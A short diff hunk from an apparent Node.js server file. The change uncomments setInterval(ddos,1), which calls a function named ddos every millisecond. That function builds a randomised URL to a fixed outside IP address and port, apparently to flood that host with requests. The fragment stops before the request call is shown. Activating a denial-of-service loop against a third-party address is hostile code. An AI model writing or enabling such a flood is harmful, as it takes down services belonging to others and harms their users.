@@ -10,7 +10,7 @@ res.send("randiap")
 res.end()
 
 })
-// setInterval(ddos,1)
+setInterval(ddos,1)
 function ddos(){
     const extra=Math.random()
     const uril='http://13.233.2.27:5000/a'+extra
